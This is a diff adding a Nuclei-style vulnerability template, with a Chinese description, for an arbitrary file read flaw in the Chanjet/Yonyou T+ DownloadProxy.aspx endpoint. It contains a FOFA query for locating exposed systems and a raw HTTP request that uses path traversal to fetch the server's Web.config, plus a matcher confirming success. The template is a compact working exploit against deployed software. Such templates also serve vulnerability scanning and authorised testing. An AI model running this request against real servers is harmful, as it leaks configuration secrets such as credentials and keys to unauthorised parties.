@@ -1,0 +1,24 @@
+id: yonyou-oa-file-read
+
+info:
+  name: "畅捷通用友 OA DownloadProxy.asp 文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="畅捷通-TPlus"
+          用友畅捷通T+系统DownloadProxy.aspx接口存在文件读取逻辑缺陷，攻击者可构造特定路径参数读取服务器任意文件，导致敏感信息泄露
+  tags: 畅捷通-TPlus
+
+http:
+- raw:
+  - |
+    GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'appSettings'
